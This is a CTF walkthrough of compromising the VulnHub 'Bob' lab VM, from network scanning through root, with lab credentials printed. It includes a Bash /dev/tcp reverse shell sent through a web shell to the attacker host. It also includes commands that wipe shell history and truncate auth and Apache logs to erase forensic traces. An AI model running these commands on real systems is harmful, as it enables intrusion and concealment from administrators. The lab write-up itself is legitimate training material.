## VulnHub Writeup: Bob 1.0.1

• Target IP: 192.168.56.103

• Attacker IP: 192.168.56.102

• Platform: Debian Linux

• Objective: Capture the root flag (flag.txt)

## 🛠️ Stage 1: Reconnaissance ##
To identify the target's IP address on the local virtual network, I performed an ARP sweep. Sweep the network for live hosts

```bash
sudo netdiscover -r 192.168.56.0/24
```

-r: Specifies the range to scan in CIDR notation.

Result: Identified the target at 192.168.56.103.

## 🔍 Stage 2: Scanning ##

I used nmap to identify open ports, service versions, and run default scripts. Comprehensive port scan

```bash
sudo nmap -sC -sV -p- -T4 192.168.56.103
```

## Flag Breakdown :

• -sC : Runs default Nmap scripts to check for common misconfigurations.

• -sV : Probes open ports to determine service and version information.

• -p- : Scans all 65,535 ports.

• -T4 : Sets the timing template to "Aggressive" for faster execution.

Findings:
| Port | State | Service | Version | Key Findings |
| :--- | :--- | :--- | :--- | :--- |
| **80** | Open | HTTP | Apache httpd 2.4.25 (Debian) | Enumerated `robots.txt` disclosing `/dev_shell.php`, `/lat_memo.html`, and `/passwords.html`. |
| **25468** | Open | SSH | OpenSSH 7.4p1 (Protocol 2.0) | Discovered SSH on a non-standard port; used for lateral movement and root pivot. |

## 🔓 Stage 3: Gaining Access ##
Investigation of /lat_memo.html indicated that the developer implemented a weak command filter on a web shell located at /dev_shell.php.

1.  **Listener Setup**:

I started a Netcat listener on my Kali machine.

```Bash
nc -lvnp 4444
```
## Flag Breakdown :

• -l : Listen mode.

• -v : Verbose.

• -n : No DNS resolution.

• -p : Local port.

2.  **Reverse Shell Execution**:

I sent a Bash reverse shell payload through the vulnerable web shell input:
    
```
bash -c 'bash -i >& /dev/tcp/192.168.56.102/4444 0>&1'
```
    
**Result**: Initial access gained as the service account **`www-data`**.


## 📈 Stage 4: Privilege Escalation ##

### Lateral Movement (User Pivot)
I searched the system for sensitive files and identified a hidden password store.

# Search for password-related files
```Bash
www-data@Milburg-High:/var/www/html$ find / -name "*password*" -type f 2>/dev/null
```
```Bash
www-data@Milburg-High:/var/www/html$ cat /home/bob/.old_passwordfile.html
```

Findings:
• Located /home/bob/.old_passwordfile.html, which contained credentials for jc (Qwerty) and seb (T1tanium_Pa$$word_Hack3rs_Fear_M3).

### Lateral Movement (Pivoting to SSH)

I harvested credentials from a hidden file at /home/bob/.old_passwordfile.html. Using these, I upgraded from the unstable web shell to a secure SSH session.

```bash
ssh seb@192.168.56.103 -p 25468
```

• seb password : T1tanium_Pa$$word_Hack3rs_Fear_M3

Result: Authenticated as seb and later identified Elliot's password (theadminisdumb) in /home/elliot/theadminisdumb.txt.

• Pivoting: I established a stable SSH connection as seb on port 25468 and later used su jc.

```bash
seb@Milburg-High:~$ su jc
```

• jc password : Qwerty

I also found Elliot's password (theadminisdumb) in /home/elliot/theadminisdumb.txt.  

```bash
jc@Milburg-High:/home/elliot$ ls -laR /home/bob /home/elliot 2>/dev/null
```

## Flag Breakdown :

• ls: The base command used to list directory contents.

• /home/bob /home/elliot: These are the specific target paths the command is looking into.

• 2>/dev/null: This redirects "stderr" (error messages) to a virtual "black hole." This is critical during penetration testing to hide "Permission Denied" errors, leaving you with only the files you actually have the rights to see.

This command is a recursive directory listing focused on the home directories of the users bob and elliot.

It was used to uncover hidden files, scripts, and sensitive documentation buried deep within the filesystem.  


## Vertical Escalation (Root)

Passphrase Extraction: I discovered a nested script at /home/bob/Documents/Secret/Keep_Out/Not_Porn/No_Lookie_In_Here/notes.sh. 

By taking the first letter of each sentence, I deciphered the acrostic passphrase HARPOCRATES.  

Decryption: I used this passphrase to decrypt Bob's password vault.
```Bash
gpg --batch --passphrase HARPOCRATES -d /home/bob/Documents/login.txt.gpg
```
Result: Decrypted Bob's password: b0bcat_.  

Root Shell:
```Bash
su bob
```
Password : b0bcat_

```Bash
sudo -i
```
## Flag Breakdown :

• -i: Simulates a login to provide the root environment.  

```Bash
root@Milbirg-High:`# id
uid=0(root) gid=0(root) groups=0(root)
```

Seeing uid=0(root) gid=0(root) groups=0(root) is the "holy grail" for a penetration tester. 

It signifies that you have successfully achieved Full System Compromise and are operating with the highest level of administrative authority on the Linux system.

**Technical breakdown**: 

1. uid=0(root)
   • UID (User ID): This is a unique numerical value assigned by Linux to every user.

   • The "0" Value: In the Linux kernel, the ID 0 is hardcoded to the root account.

   • Meaning: You are no longer a standard user with restricted access; you are the "Superuser." You can read, modify, or delete any file on the system, regardless of its original permissions.

2. gid=0(root)
   • GID (Group ID): This is the ID of the user's primary group.

   • Meaning: You belong to the root group, which typically shares administrative ownership of critical system binaries and configuration files.

3. groups=0(root)
   • Groups: This lists all supplementary groups the user belongs to.

   • Meaning: Being in the root group allows you to execute administrative commands and access system hardware that is restricted to standard users. 

```Bash
root@Milbirg-High:`# cat flag.txt
hey n there flag.txt
```

Flag: Captured flag.txt in the /root directory.  

## 🔑 Harvested Credentials

| User | Password | Discovery Method |
| :--- | :--- | :--- |
| **jc** | `Qwerty` | Cleartext in `/home/bob/.old_passwordfile.html`[cite: 1] |
| **seb** | `T1tanium_Pa$$word_Hack3rs_Fear_M3` | Cleartext in `/home/bob/.old_passwordfile.html`[cite: 1] |
| **elliot** | `theadminisdumb` | Plaintext note in `/home/elliot/theadminisdumb.txt`[cite: 1] |
| **bob** | `b0bcat_` | GPG Decryption (Passphrase: `HARPOCRATES`)[cite: 1] |
| **root** | N/A | Vertical Escalation via `sudo -i` as Bob[cite: 1] |
## 🛡️ Stage 5: Maintain Access ##
Persistence is achieved via the non-standard SSH service (Port 25468) using the recovered administrator credentials for bob.

## 🧹 Stage 6: Clear Tracks ##

To remove forensic evidence of the intrusion, I sanitized the system logs and command history.

# Clear command history
```Bash
history -c && rm /root/.bash_history
```

# Truncate system logs
```Bash
truncate -s 0 /var/log/auth.log
truncate -s 0 /var/log/apache2/access.log
truncate -s 0 /var/log/apache2/error.log
```
## Flag Breakdown :

history -c: Clears the current session's history buffer.  
truncate -s 0: Empties the log files without deleting them, preventing service errors while removing the forensic trail. 

# Final Status: Root Compromised. Tracks Cleared. 
